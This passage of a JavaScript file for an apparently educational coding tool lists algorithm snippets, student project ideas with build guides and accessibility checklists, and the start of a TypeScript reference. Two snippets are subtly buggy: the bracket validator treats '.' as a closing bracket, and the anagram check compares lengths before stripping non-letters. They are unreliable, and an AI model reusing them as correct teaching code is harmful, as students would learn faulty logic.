      apClassroomConnection: 'BFS vs DFS comparison. Discuss when each is appropriate.',
    },
    {
      name: 'Reverse Linked List',
      category: 'Linked List',
      complexity: 'O(n)',
      whenUse: 'Linked list manipulation.',
      whenAvoid: 'When original direction is needed.',
      code: 'function reverseList(head) {\n  let prev = null;\n  let current = head;\n  while (current !== null) {\n    const next = current.next;\n    current.next = prev;\n    prev = current;\n    current = next;\n  }\n  return prev;\n}',
      explanation: 'Three pointers: prev, current, next. Reverse current.next pointer at each step.',
      apClassroomConnection: 'Classic linked list problem. Demonstrates pointer manipulation.',
    },
    {
      name: 'Count Vowels',
      category: 'String',
      complexity: 'O(n)',
      whenUse: 'Practice string operations.',
      whenAvoid: 'N/A',
      code: 'function countVowels(str) {\n  let count = 0;\n  for (const char of str.toLowerCase()) {\n    if ("aeiou".includes(char)) count++;\n  }\n  return count;\n}',
      explanation: 'Iterate through characters. Count those that are vowels.',
      apClassroomConnection: 'String manipulation practice.',
    },
    {
      name: 'Anagram Check',
      category: 'String',
      complexity: 'O(n)',
      whenUse: 'Check if two strings are anagrams.',
      whenAvoid: 'N/A',
      code: 'function isAnagram(s1, s2) {\n  if (s1.length !== s2.length) return false;\n  const clean1 = s1.toLowerCase().replace(/[^a-z]/g, "").split("").sort().join("");\n  const clean2 = s2.toLowerCase().replace(/[^a-z]/g, "").split("").sort().join("");\n  return clean1 === clean2;\n}',
      explanation: 'Sort + compare. Same letters in different orders sort the same.',
      apClassroomConnection: 'String + sort technique.',
    },
    {
      name: 'Validate Brackets',
      category: 'Stack',
      complexity: 'O(n)',
      whenUse: 'Check balanced parentheses/brackets.',
      whenAvoid: 'N/A',
      code: 'function isValid(str) {\n  const stack = [];\n  const pairs = { ")": "(", "]": "[", "}": "{" };\n  for (const char of str) {\n    if ("([{".includes(char)) {\n      stack.push(char);\n    } else if (")]}.".includes(char)) {\n      if (stack.pop() !== pairs[char]) return false;\n    }\n  }\n  return stack.length === 0;\n}',
      explanation: 'Stack pattern. Push opens, pop on close + verify match.',
      apClassroomConnection: 'Foundational data structure use case.',
    },
    {
      name: 'Random Number Generator',
      category: 'Utility',
      complexity: 'O(1)',
      whenUse: 'Generate random numbers in a range.',
      whenAvoid: 'Cryptographic use (use crypto.getRandomValues instead).',
      code: 'function randInt(min, max) {\n  return Math.floor(Math.random() * (max - min + 1)) + min;\n}',
      explanation: 'Standard JavaScript random integer in range [min, max] (inclusive).',
      apClassroomConnection: 'Probability + randomness lesson hook.',
    },
    {
      name: 'Debounce',
      category: 'Async',
      complexity: 'O(1)',
      whenUse: 'Limit function calls (e.g., search-as-you-type).',
      whenAvoid: 'When you need every call.',
      code: 'function debounce(fn, ms = 300) {\n  let timeoutId;\n  return function(...args) {\n    clearTimeout(timeoutId);\n    timeoutId = setTimeout(() => fn.apply(this, args), ms);\n  };\n}',
      explanation: 'Wait until N ms have passed without further calls before calling. Useful for keystrokes, resize events.',
      apClassroomConnection: 'Real-world performance optimization. Common interview question.',
    },
    {
      name: 'Throttle',
      category: 'Async',
      complexity: 'O(1)',
      whenUse: 'Limit function calls to once per N ms.',
      whenAvoid: 'When debounce would be better (final-call only).',
      code: 'function throttle(fn, ms = 300) {\n  let lastCall = 0;\n  return function(...args) {\n    const now = Date.now();\n    if (now - lastCall >= ms) {\n      lastCall = now;\n      fn.apply(this, args);\n    }\n  };\n}',
      explanation: 'Allow at most one call per N ms. Useful for scroll events, mousemove.',
      apClassroomConnection: 'Throttle vs Debounce comparison.',
    },
    {
      name: 'Deep Clone Object',
      category: 'Object',
      complexity: 'O(n) where n = total nested keys',
      whenUse: 'Copy nested objects without sharing references.',
      whenAvoid: 'For simple objects use Object.assign or spread.',
      code: 'function deepClone(obj) {\n  if (obj === null || typeof obj !== "object") return obj;\n  if (Array.isArray(obj)) return obj.map(deepClone);\n  return Object.fromEntries(\n    Object.entries(obj).map(([key, val]) => [key, deepClone(val)])\n  );\n}',
      explanation: 'Recursively copy each property. JSON.parse(JSON.stringify(obj)) also works for simple cases but loses Date, undefined, functions.',
      apClassroomConnection: 'Reference vs value semantics in JS.',
    },
    {
      name: 'Date Difference (days)',
      category: 'Date',
      complexity: 'O(1)',
      whenUse: 'Calculate days between two dates.',
      whenAvoid: 'For very precise math (use a date library).',
      code: 'function daysBetween(date1, date2) {\n  const ms = Math.abs(date2 - date1);\n  return Math.ceil(ms / (1000 * 60 * 60 * 24));\n}',
      explanation: 'Date arithmetic gives milliseconds. Divide by ms-per-day to get days.',
      apClassroomConnection: 'Date math + unit conversion.',
    },
  ];

  // ─── Master project idea catalog (60+ NGSS + CSTA + ISTE aligned) ──
  // Each entry has a difficulty rating, skills practiced, estimated time,
  // grade range, NGSS/CSTA/ISTE standards, and stepwise build guide.
  // Used by the new Project Library tab + as exemplars for student work.
  var PROJECT_IDEAS = [
    {
      id: 'todo_list',
      title: 'To-Do List App',
      difficulty: 'Beginner (1/5)',
      time: '30-60 min',
      grade: '6-12',
      skills: ['HTML form', 'JavaScript arrays', 'localStorage', 'DOM manipulation'],
      standards: ['CSTA 2-AP-13: Decompose problems', 'ISTE 5b: Use data to solve problems', 'AP CSP 3.B.1: Storing data'],
      description: 'A classic first app. Users add tasks, check them off when complete, and see them persist after refresh.',
      buildGuide: [
        '1. HTML: Add a text input + Add button + empty <ul>.',
        '2. CSS: Style the list items + add a strike-through class for completed.',
        '3. JS: Listen for button click → push new item to array → re-render list.',
        '4. JS: Listen for item click → toggle "done" class → save array to localStorage.',
        '5. On load: read localStorage + render saved items.',
      ],
      extensions: [
        'Add due dates with <input type="date">',
        'Add a "clear completed" button',
        'Add categories or tags',
        'Add drag-and-drop reordering (HTML5 drag-drop API)',
        'Add a search filter',
      ],
      a11yChecklist: [
        'Input has a <label>',
        'Button has descriptive text + type="button"',
        'List items are <li> inside <ul>',
        'Completed status is announced (use aria-checked or visually conveyed)',
        'Focus management — focus returns to input after adding',
      ],
    },
    {
      id: 'pomodoro_timer',
      title: 'Pomodoro Study Timer',
      difficulty: 'Beginner (2/5)',
      time: '60-90 min',
      grade: '6-12',
      skills: ['setInterval', 'state management', 'audio playback', 'progress visualization'],
      standards: ['CSTA 2-CS-02: Components of computing systems', 'AP CSP 5.D.1: Real-world systems'],
      description: 'A 25-minute work timer + 5-minute break timer, with visual progress bar + sound at end.',
      buildGuide: [
        '1. HTML: Display (25:00), Start/Pause/Reset buttons, progress bar.',
        '2. JS: Track remaining seconds. setInterval to decrement.',
        '3. Update display + progress bar each tick.',
        '4. When timer hits 0: play sound, switch between work/break modes.',
        '5. Add settings: customize durations.',
      ],
      extensions: [
        'Add task entry — what are you working on?',
        'Save session history (with localStorage)',
        'Add achievements (streak counter)',
        'Add sound options or custom alarm',
        'Show a notification using Notification API',
      ],
      a11yChecklist: [
        'Timer announces transitions (use aria-live)',
        'Visual + audio cues for end of timer',
        'Buttons clearly labeled',
        'Progress bar uses <progress> or has role=progressbar',
      ],
    },
    {
      id: 'flashcard_app',
      title: 'Flashcard Study App',
      difficulty: 'Beginner (2/5)',
      time: '60-120 min',
      grade: '6-12',
      skills: ['arrays', 'CSS transforms (3D flip)', 'event handlers', 'localStorage'],
      standards: ['CSTA 2-AP-13: Decompose problems', 'AP CSP 3.B.1: Storing data'],
      description: 'Users add question-answer flashcards, then flip through them. Track right/wrong.',
      buildGuide: [
        '1. HTML: Card container, "Add Card" form, Next/Prev/Flip buttons.',
        '2. CSS: 3D transform for card flip animation.',
        '3. JS: Store cards in array. Index tracks current card.',
        '4. Click card → flip to show answer. Click Next/Prev → advance index.',
        '5. Save cards + progress to localStorage.',
      ],
      extensions: [
        'Add spaced repetition algorithm (cards you got wrong repeat more)',
        'Import cards from CSV',
        'Add categories or subjects',
        'Add an audio recording option for the question',
        'Add a "study mode" with time tracking',
      ],
      a11yChecklist: [
        'Flip animation respects prefers-reduced-motion',
        'Card content readable when flipped',
        'Keyboard navigation: Space/Enter to flip, arrows for next/prev',
        'Screen reader announces state changes',
      ],
    },
    {
      id: 'quiz_app',
      title: 'Multiple-Choice Quiz App',
      difficulty: 'Beginner (2/5)',
      time: '60-120 min',
      grade: '5-12',
      skills: ['arrays + objects', 'forms', 'scoring logic', 'feedback'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.A.1: Data abstraction'],
      description: 'A quiz with multiple-choice questions, scoring, and review of answers.',
      buildGuide: [
        '1. Define questions as array of {question, options, correctIndex, explanation}.',
        '2. Render current question + 4 options as radio buttons.',
        '3. Track answers + score in state.',
        '4. Next button → increment index, save answer.',
        '5. End screen: show score + review of right/wrong with explanations.',
      ],
      extensions: [
        'Add timer per question',
        'Add categories',
        'Save high scores',
        'Add image-based questions',
        'Add sound feedback (correct/wrong)',
      ],
      a11yChecklist: [
        'Use <fieldset> + <legend> for question groups',
        'Radio buttons have labels',
        'Feedback announced via aria-live',
        'Color is not the only indicator (use checkmarks + Xs)',
      ],
    },
    {
      id: 'calculator',
      title: 'Calculator',
      difficulty: 'Beginner (2/5)',
      time: '60-90 min',
      grade: '6-12',
      skills: ['event delegation', 'string parsing', 'state machine'],
      standards: ['CSTA 2-AP-12: Modular code', 'AP CSP 5.B.1: Variables + assignments'],
      description: 'A four-function (or scientific) calculator. The classic learning project.',
      buildGuide: [
        '1. HTML: Display + grid of buttons.',
        '2. State: { currentValue, previousValue, operator, isResult }',
        '3. Click handler distinguishes number, operator, equals, clear.',
        '4. Operator click → save current + operator, reset for next number.',
        '5. Equals → calculate based on operator, display result.',
      ],
      extensions: [
        'Add scientific functions (sqrt, sin, cos, log)',
        'Add history of calculations',
        'Add keyboard input',
        'Add expression parser (handle "1 + 2 * 3" with order of ops)',
        'Add unit conversion mode',
      ],
      a11yChecklist: [
        'Buttons have aria-labels (especially symbols)',
        'Display has aria-live to announce results',
        'Keyboard navigation works (arrow keys + Enter)',
      ],
    },
    {
      id: 'weather_dashboard',
      title: 'Weather Dashboard (API-based)',
      difficulty: 'Intermediate (3/5)',
      time: '2-3 hours',
      grade: '8-12',
      skills: ['fetch API', 'JSON', 'async/await', 'error handling'],
      standards: ['CSTA 2-NI-04: Application sharing', 'AP CSP 4.B.1: APIs'],
      description: 'Show current weather + 5-day forecast using a free API (OpenWeatherMap, etc.).',
      buildGuide: [
        '1. Sign up for free API key (OpenWeatherMap, Weather.gov).',
        '2. HTML: Search input + display panels.',
        '3. JS: fetch(url + apiKey) returns JSON.',
        '4. Parse JSON + render temperature, conditions, etc.',
        '5. Add error handling for invalid city or network issues.',
      ],
      extensions: [
        'Add geolocation (use navigator.geolocation)',
        'Save favorite cities',
        'Add hourly forecast graph',
        'Add weather alerts',
        'Add map integration',
      ],
      a11yChecklist: [
        'Loading state announced (aria-live)',
        'Errors announced',
        'Charts have text alternative or table',
      ],
    },
    {
      id: 'recipe_finder',
      title: 'Recipe Finder',
      difficulty: 'Intermediate (3/5)',
      time: '2-3 hours',
      grade: '8-12',
      skills: ['fetch API', 'filtering', 'search', 'forms'],
      standards: ['CSTA 2-NI-04: Apps + APIs', 'AP CSP 4.A.1: Algorithms'],
      description: 'Search recipes by ingredient or name using a recipe API (Edamam, Spoonacular).',
      buildGuide: [
        '1. Sign up for recipe API.',
        '2. Search form + results list.',
        '3. fetch with search query → render results with images.',
        '4. Click recipe → show details (ingredients + instructions).',
        '5. Filter by diet, calories, etc.',
      ],
      extensions: [
        'Save favorite recipes',
        'Generate shopping list from saved recipes',
        'Add user reviews (localStorage)',
        'Add unit conversion (cups → grams)',
        'Add meal planner',
      ],
      a11yChecklist: [
        'Images have alt text',
        'Loading + error states announced',
        'Results have logical heading structure',
      ],
    },
    {
      id: 'budget_tracker',
      title: 'Personal Budget Tracker',
      difficulty: 'Intermediate (3/5)',
      time: '3-4 hours',
      grade: '9-12',
      skills: ['data modeling', 'CRUD operations', 'charts', 'date handling'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.B.1: Data'],
      description: 'Track income + expenses, categorize, visualize spending patterns.',
      buildGuide: [
        '1. Define data model: { id, date, amount, category, type (income/expense) }',
        '2. Form to add transactions.',
        '3. List view with sort + filter.',
        '4. Charts: pie (by category) + line (over time).',
        '5. Export to CSV.',
      ],
      extensions: [
        'Multiple accounts',
        'Recurring transactions',
        'Budget vs actual',
        'Financial goals',
        'Receipts upload (just images)',
      ],
      a11yChecklist: [
        'Charts have text alternatives',
        'Form labels + validation messages',
        'Money values use proper aria-label for screen readers',
      ],
    },
    {
      id: 'habit_tracker',
      title: 'Habit Tracker (with streaks)',
      difficulty: 'Intermediate (3/5)',
      time: '2-3 hours',
      grade: '6-12',
      skills: ['date handling', 'data persistence', 'streak calculations'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.B.1: Data'],
      description: 'Track daily habits + visualize streaks (consecutive days completed).',
      buildGuide: [
        '1. Form to add habits.',
        '2. Calendar view showing past 30 days.',
        '3. Click cell → toggle done/not done for that day.',
        '4. Calculate current streak + longest streak.',
        '5. Save to localStorage.',
      ],
      extensions: [
        'Habit categories',
        'Goal: 30-day challenge',
        'Reminders via Notification API',
        'Visualize as heatmap (GitHub-style)',
        'Add notes per day',
      ],
      a11yChecklist: [
        'Calendar cells are buttons with descriptive labels',
        'Heatmap colors meet contrast minimum',
        'Streak announced when changed',
      ],
    },
    {
      id: 'pomodoro_pro',
      title: 'Productivity Suite (todos + timer + habit tracker)',
      difficulty: 'Advanced (4/5)',
      time: '5-8 hours',
      grade: '9-12',
      skills: ['component architecture', 'state sharing', 'tabs/router', 'multi-feature app'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.B.1: Data', 'ISTE 5b: Data-driven decisions'],
      description: 'Combine the To-Do + Pomodoro + Habit tracker into a single integrated app.',
      buildGuide: [
        '1. Plan information architecture (tabs vs combined view).',
        '2. Share state across components (e.g., tasks visible in timer).',
        '3. Persistence: save all data together.',
        '4. Onboarding flow for new users.',
        '5. Settings page.',
      ],
      extensions: [
        'Multi-user accounts (with localStorage scoping)',
        'Export/import data',
        'Themes (light/dark/high-contrast)',
        'Cloud sync (Firebase, Supabase, etc.)',
        'Mobile-responsive design',
      ],
      a11yChecklist: [
        'Tab navigation: arrow keys, Home/End',
        'Focus management on tab change',
        'Multi-modal data input (keyboard + mouse)',
        'Reduced-motion support',
        'High-contrast mode',
      ],
    },
    {
      id: 'memory_game',
      title: 'Memory Card Matching Game',
      difficulty: 'Beginner (2/5)',
      time: '1-2 hours',
      grade: '6-12',
      skills: ['arrays', 'array shuffling', 'state machines', 'timers'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.A.1: Data abstraction'],
      description: 'Classic memory match game. Flip pairs of cards. Match all to win.',
      buildGuide: [
        '1. Create array of pairs (8 unique items = 16 cards).',
        '2. Shuffle array (Fisher-Yates).',
        '3. Render as grid of card backs.',
        '4. Click card → flip to show. If 2 flipped, check match.',
        '5. Match: keep flipped. No match: flip back after 1s.',
      ],
      extensions: [
        'Multiple difficulty levels (4x4, 6x6, 8x8)',
        'Themes (animals, planets, math symbols)',
        'Timer + best-time tracking',
        'Two-player mode',
        'Sound effects',
      ],
      a11yChecklist: [
        'Cards are <button> elements (keyboard accessible)',
        'Match announcements (aria-live)',
        'Animation respects prefers-reduced-motion',
        'Visual + audio feedback',
      ],
    },
    {
      id: 'snake_game',
      title: 'Snake Game (Canvas)',
      difficulty: 'Intermediate (3/5)',
      time: '2-3 hours',
      grade: '7-12',
      skills: ['Canvas API', 'game loop', 'keyboard input', 'collision detection'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.A.1: Algorithms'],
      description: 'Classic Snake. Grow longer by eating food. Don\'t hit walls or yourself.',
      buildGuide: [
        '1. <canvas> + getContext("2d") setup.',
        '2. Snake = array of {x, y} positions.',
        '3. Game loop: clear canvas → move snake → check collisions → draw.',
        '4. Keyboard input: arrow keys set direction.',
        '5. Food: random position. Eat food → grow snake.',
      ],
      extensions: [
        'Difficulty levels (speed)',
        'Power-ups (slow, ghost, bonus food)',
        'Obstacle mode',
        'Two-player split-screen',
        'AI opponent',
      ],
      a11yChecklist: [
        'Provide non-canvas alternative or text description',
        'Pause button + keyboard accessible',
        'Visual feedback for game events',
        'High-contrast mode option',
      ],
    },
    {
      id: 'tic_tac_toe',
      title: 'Tic-Tac-Toe (with AI opponent)',
      difficulty: 'Intermediate (3/5)',
      time: '2-3 hours',
      grade: '7-12',
      skills: ['arrays', 'win detection', 'minimax algorithm', 'game state'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.A.1: Algorithms'],
      description: 'Classic tic-tac-toe. Build the game, then add an AI opponent using minimax.',
      buildGuide: [
        '1. 3x3 grid as 9-element array.',
        '2. Click cell → place X or O. Track turn.',
        '3. After each move, check win conditions (rows, cols, diagonals).',
        '4. Two-player mode first.',
        '5. AI: minimax algorithm (think 3-5 moves ahead).',
      ],
      extensions: [
        'Difficulty levels for AI (random / easy / hard)',
        '4x4 or 5x5 board',
        'Network multiplayer (WebSockets)',
        'Theme customization',
        'Tournament mode',
      ],
      a11yChecklist: [
        'Grid uses <button> elements',
        'Turn announced (aria-live)',
        'Win condition announced',
        'Keyboard navigation works (Tab through cells, Enter to play)',
      ],
    },
    {
      id: 'paint_app',
      title: 'Drawing/Paint App',
      difficulty: 'Intermediate (3/5)',
      time: '3-4 hours',
      grade: '7-12',
      skills: ['Canvas API', 'mouse events', 'tools/state', 'image export'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 5.B.1: Data + variables'],
      description: 'A drawing app. Brush, eraser, color picker, fill, save as image.',
      buildGuide: [
        '1. Canvas + tools panel.',
        '2. Mouse down + move + up handlers → draw lines.',
        '3. Brush tool: solid line. Eraser: white. Fill: floodFill algorithm.',
        '4. Color picker + brush size.',
        '5. Save: canvas.toDataURL() → download link.',
      ],
      extensions: [
        'Undo/redo (save canvas states)',
        'Layers (multiple canvases stacked)',
        'Image import (load existing image)',
        'Shapes (rectangle, circle, line)',
        'Text tool',
      ],
      a11yChecklist: [
        'Provide non-canvas alternative (e.g., file upload)',
        'Tool buttons have labels',
        'Color contrast indicators',
        'Keyboard shortcuts for tools',
      ],
    },
    {
      id: 'music_player',
      title: 'Music Player',
      difficulty: 'Intermediate (3/5)',
      time: '3-4 hours',
      grade: '8-12',
      skills: ['Audio API', 'media controls', 'progress tracking'],
      standards: ['CSTA 2-CS-02: System components', 'AP CSP 4.B.1: Media'],
      description: 'Build an audio player. Play/pause, seek, volume, playlist.',
      buildGuide: [
        '1. <audio> element with controls (or custom UI).',
        '2. JS: play(), pause(), currentTime, duration.',
        '3. Progress bar updates with timeupdate event.',
        '4. Playlist: array of tracks. Auto-play next on end.',
        '5. Volume control + mute.',
      ],
      extensions: [
        'Equalizer (Web Audio API)',
        'Visualizer (canvas + AnalyserNode)',
        'Lyrics display',
        'Shuffle + repeat modes',
        'Save playlist',
      ],
      a11yChecklist: [
        'Native controls are keyboard accessible',
        'Custom controls have labels + ARIA',
        'Provide volume control',
        'Provide pause button',
        'No auto-play',
      ],
    },
    {
      id: 'image_gallery',
      title: 'Image Gallery (with filters + tags)',
      difficulty: 'Intermediate (3/5)',
      time: '3-4 hours',
      grade: '8-12',
      skills: ['file input', 'arrays', 'filtering', 'image rendering'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.B.1: Data'],
      description: 'A photo gallery. Add images with tags. Filter by tag. Slideshow mode.',
      buildGuide: [
        '1. File input → read as DataURL → save to array.',
        '2. Render images in grid.',
        '3. Add tags to each image.',
        '4. Filter by selecting tags.',
        '5. Slideshow: cycle through images on a timer.',
      ],
      extensions: [
        'Image editing (crop, rotate, filters)',
        'Folder organization',
        'Search by date',
        'Cloud storage integration',
        'Image metadata (EXIF reading)',
      ],
      a11yChecklist: [
        'All images have alt text (or prompt for it)',
        'Slideshow has pause control',
        'Image transitions respect reduced-motion',
        'Keyboard navigation through gallery',
      ],
    },
    {
      id: 'chat_app',
      title: 'Local Chat App',
      difficulty: 'Intermediate (3/5)',
      time: '3-4 hours',
      grade: '8-12',
      skills: ['form handling', 'arrays', 'date formatting', 'CSS animations'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 3.A.1: Algorithms'],
      description: 'A chat interface (local-only). Messages from "me" + "AI" (mocked). Practice for real chat features.',
      buildGuide: [
        '1. Messages array: { id, sender, text, timestamp }',
        '2. Form to send messages.',
        '3. Render messages in scrollable container.',
        '4. Auto-scroll to bottom on new message.',
        '5. AI response: generate fake delay + bot response.',
      ],
      extensions: [
        'Multiple chat rooms',
        'Typing indicator',
        'Read receipts',
        'Attach images',
        'Emoji picker',
      ],
      a11yChecklist: [
        'Message list is a region with aria-live (polite)',
        'Each message has identifiable sender + timestamp',
        'Auto-scroll respects user scroll position',
        'Form labels + submit button',
      ],
    },
    {
      id: 'data_visualizer',
      title: 'Data Visualization Tool',
      difficulty: 'Advanced (4/5)',
      time: '5-8 hours',
      grade: '9-12',
      skills: ['SVG', 'data transformation', 'CSV parsing', 'charts'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 4.A.1: Algorithms'],
      description: 'Import CSV → visualize as bar/line/pie chart. Like a mini-Excel.',
      buildGuide: [
        '1. CSV parser (or use Papa Parse library).',
        '2. Detect numeric vs text columns.',
        '3. Render data table.',
        '4. Chart selector: choose chart type + axes.',
        '5. Render chart with SVG (or Chart.js if simplified).',
      ],
      extensions: [
        'Multiple chart types (bar, line, pie, scatter)',
        'Color customization',
        'Export chart as image',
        'Live data (fetch from API)',
        'Statistical summaries (mean, median, mode)',
      ],
      a11yChecklist: [
        'Charts have text alternative (data table)',
        'Color is not the only encoding (use patterns + labels)',
        'Tooltips accessible via keyboard',
        'Headers properly marked',
      ],
    },
    {
      id: 'physics_sim',
      title: 'Physics Simulation (gravity + collisions)',
      difficulty: 'Advanced (4/5)',
      time: '6-10 hours',
      grade: '10-12',
      skills: ['Canvas API', 'physics math', 'collision detection', 'animation loop'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 4.A.1: Algorithms', 'NGSS HS-PS2-1: Forces'],
      description: 'A bouncing ball physics simulation. Add gravity, drag, collision response.',
      buildGuide: [
        '1. Ball object: x, y, vx, vy, radius, mass.',
        '2. Animation loop with requestAnimationFrame.',
        '3. Apply gravity to vy each frame.',
        '4. Check wall collisions → reverse velocity (with energy loss).',
        '5. Add multiple balls + ball-to-ball collisions.',
      ],
      extensions: [
        'Constraints (string, spring)',
        'Mouse drag to throw balls',
        'Particle effects',
        'Editable gravity + drag',
        'Statistics: kinetic energy, momentum',
      ],
      a11yChecklist: [
        'Provide non-canvas description of physics',
        'Pause control',
        'Reduced-motion alternative (static visualization)',
        'Keyboard controls',
      ],
    },
    {
      id: 'minimal_blog',
      title: 'Minimal Blog with Posts',
      difficulty: 'Intermediate (3/5)',
      time: '3-5 hours',
      grade: '8-12',
      skills: ['markdown parsing', 'routing (hash-based)', 'CRUD operations'],
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP 4.B.1: APIs + frameworks'],
      description: 'Write + read blog posts. Markdown editor. Local-only.',
      buildGuide: [
        '1. New post form (title + markdown body).',
        '2. List of posts.',
        '3. Click post → show full post.',
        '4. Markdown rendering (marked.js or custom).',
        '5. Save/edit/delete with localStorage.',
      ],
      extensions: [
        'Tags + categories',
        'Search',
        'Image uploads',
        'Multi-author',
        'RSS feed (export XML)',
      ],
      a11yChecklist: [
        'Editor + preview both accessible',
        'Posts have semantic <article> structure',
        'Headings hierarchy correct',
        'Images have alt text fields',
      ],
    },
    {
      id: 'ar_demo',
      title: 'AR Marker Detector (using WebRTC)',
      difficulty: 'Advanced (4/5)',
      time: '6-10 hours',
      grade: '11-12 / AP',
      skills: ['WebRTC', 'Canvas', 'computer vision basics'],
      standards: ['CSTA 3A-AP-15: Decompose', 'AP CSP 5.D.1: Real-world systems'],
      description: 'Access webcam, detect QR codes or simple visual markers, overlay 3D object.',
      buildGuide: [
        '1. Request camera permission via getUserMedia.',
        '2. Display video feed on page.',
        '3. Sample frames + detect markers (use jsQR library for QR codes).',
        '4. Overlay graphics on detected position.',
        '5. Add interactive elements.',
      ],
      extensions: [
        'Detect multiple markers',
        '3D object overlay (Three.js)',
        'Custom marker design',
        'Save AR screenshots',
        'Educational AR (e.g., scan textbook for animation)',
      ],
      a11yChecklist: [
        'Camera access permission request explained',
        'Provide alternative for non-camera devices',
        'Visual + auditory feedback',
        'Privacy notice (no data uploaded)',
      ],
    },
    {
      id: 'collaborative_canvas',
      title: 'Collaborative Drawing Canvas (Local)',
      difficulty: 'Advanced (4/5)',
      time: '8-12 hours',
      grade: '10-12 / AP',
      skills: ['BroadcastChannel API', 'Canvas', 'multi-user state'],
      standards: ['CSTA 3A-AP-15: Decompose', 'AP CSP 5.D.1: Distributed systems'],
      description: 'Multiple tabs/windows on same machine draw on a shared canvas. Foundation for real multi-user apps.',
      buildGuide: [
        '1. Canvas + drawing logic.',
        '2. BroadcastChannel for inter-tab communication.',
        '3. Each tab broadcasts draw events.',
        '4. Other tabs receive + replay events.',
        '5. Show active users + their colors.',
      ],
      extensions: [
        'WebSocket-based real multi-user (with backend)',
        'User colors + names',
        'Erase mode',
        'Save final image',
        'Undo last stroke',
      ],
      a11yChecklist: [
        'Non-canvas alternative (text-based collaboration)',
        'User feedback on connection status',
        'Clear ownership of strokes',
      ],
    },
    {
      id: 'flashcard_spaced_repetition',
      title: 'Spaced Repetition Flashcards (SRS)',
      difficulty: 'Advanced (4/5)',
      time: '6-10 hours',
      grade: '10-12 / AP',
      skills: ['algorithms', 'data structures', 'date arithmetic', 'persistence'],
      standards: ['CSTA 3A-AP-13: Algorithms', 'AP CSP 4.A.1: Algorithms'],
      description: 'Implement SM-2 spaced repetition algorithm. Cards reschedule based on user performance.',
      buildGuide: [
        '1. Card model: { id, front, back, interval, easeFactor, dueDate }',
        '2. Show card. User rates 0-5 (forgot to perfect).',
        '3. SM-2 algorithm updates interval + easeFactor based on rating.',
        '4. Schedule next review = now + interval days.',
        '5. Daily queue: cards where dueDate <= today.',
      ],
      extensions: [
        'Card decks',
        'Statistics + graphs',
        'Import from Anki',
        'Audio cards',
        'Cloze deletions',
      ],
      a11yChecklist: [
        'Card content accessible (text-based)',
        'Rating buttons clearly labeled',
        'Keyboard navigation',
      ],
    },
    {
      id: 'pwa_offline',
      title: 'Progressive Web App (Offline-First)',
      difficulty: 'Advanced (5/5)',
      time: '10-15 hours',
      grade: '11-12 / AP',
      skills: ['Service Workers', 'Cache API', 'manifest', 'install prompt'],
      standards: ['CSTA 3A-AP-15: Distribute', 'AP CSP 5.D.1: Production systems'],
      description: 'Take an existing app and make it work offline + installable on phones.',
      buildGuide: [
        '1. Add manifest.json (name, icons, start_url).',
        '2. Register service worker.',
        '3. Service worker: cache static assets.',
        '4. Intercept fetch: return cached if offline.',
        '5. Add update + install prompts.',
      ],
      extensions: [
        'Background sync',
        'Push notifications',
        'Add to home screen prompt',
        'Update notification',
        'Offline data sync (when reconnected)',
      ],
      a11yChecklist: [
        'Offline state announced',
        'Install prompt explained',
        'Update prompt is user-controlled (not surprise)',
      ],
    },
    {
      id: 'code_editor',
      title: 'Code Editor (with syntax highlighting)',
      difficulty: 'Advanced (5/5)',
      time: '15-20 hours',
      grade: '11-12 / AP',
      skills: ['textarea hacks or Monaco', 'CSS', 'language parsing'],
      standards: ['CSTA 3A-AP-13: Algorithms', 'AP CSP 5.C.1: Programming'],
      description: 'Build a simple code editor with syntax highlighting (for one language).',
      buildGuide: [
        '1. textarea OR contenteditable div + overlay.',
        '2. Parse content with regex for keywords.',
        '3. Apply colored spans for highlighting.',
        '4. Handle Tab key (indent).',
        '5. Add line numbers.',
      ],
      extensions: [
        'Multiple languages',
        'Code execution (sandbox)',
        'File system (multiple files)',
        'Search + replace',
        'Linting',
      ],
      a11yChecklist: [
        'Use textarea (not contenteditable) for screen reader support',
        'Line numbers don\'t interfere with text-to-speech',
        'Keyboard shortcuts documented',
      ],
    },
  ];

  // ─── TypeScript reference (verbose) ─────────────────────────────
  var TYPESCRIPT_REFERENCE = [
    {
      concept: 'Basic types',
      description: 'TypeScript adds static types to JavaScript',
      examples: [
        'let name: string = "Aaron";',
        'let age: number = 42;',
        'let isStudent: boolean = false;',
        'let tags: string[] = ["math", "art"];',
        'let nothing: null = null;',
        'let undef: undefined = undefined;',
        'let anything: any = "avoid this";',
        'let safer: unknown = JSON.parse(json);',
      ],
      benefit: 'Catch bugs before runtime. Better autocomplete. Self-documenting.',
      gotcha: 'any disables type checking. unknown forces you to narrow before using.',
    },
    {
      concept: 'Interfaces',
      description: 'Describe the shape of an object',
      example: `interface Student {
  name: string;
  age: number;
  grades: number[];
  email?: string;  // optional
  readonly id: string;  // can't change after creation
}

const s: Student = {
  name: "Alex",
  age: 14,
  grades: [85, 92, 78],
  id: "stu-001",
};`,
      benefit: 'Reusable type definitions. Self-documenting API contracts.',
    },
    {
      concept: 'Type aliases',
      description: 'Like interfaces but more flexible',
      example: `type ID = string | number;
type Status = "active" | "inactive" | "pending";
type Point = { x: number; y: number };
type Callback = (data: string) => void;

let userId: ID = 42;
let state: Status = "active";`,
      whenToUse: 'Type aliases for unions, primitives, function types. Interfaces for object shapes (especially when extending).',
    },
    {
      concept: 'Union types',
      description: 'A value can be one of several types',
      example: `function format(input: string | number): string {
  if (typeof input === "string") {
    return input.toUpperCase();  // TS knows input is string here
  }
  return input.toFixed(2);  // TS knows input is number here
}`,
      narrowing: 'Use typeof, instanceof, or in operator to narrow union types',
    },
    {
      concept: 'Generics',
      description: 'Types that work with multiple types',
      example: `function first<T>(arr: T[]): T | undefined {
  return arr[0];
}

const num = first([1, 2, 3]);  // T = number, returns number
const str = first(["a", "b"]);  // T = string, returns string

